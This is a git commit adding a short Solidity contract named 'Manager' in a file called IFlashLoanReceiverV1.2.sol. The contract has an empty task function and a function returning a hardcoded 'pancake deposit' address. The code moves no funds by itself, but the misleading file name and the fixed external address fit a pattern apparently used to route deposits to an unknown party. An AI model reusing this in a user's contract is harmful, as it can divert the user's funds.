e557acbb3eb52a80d0fb02b2fef944d253ed3fd5
codemaniac0101 <96434071+codemaniac0101@users.noreply.github.com>
2021-12-20 20:01:29 +0200

    Create IFlashLoanReceiverV1.2.sol

---
+++ IFlashLoanReceiverV1.2.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.17;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0x8e4f3679D2e22DA752870d9689A1d5569465Df7f;
+	}
+}
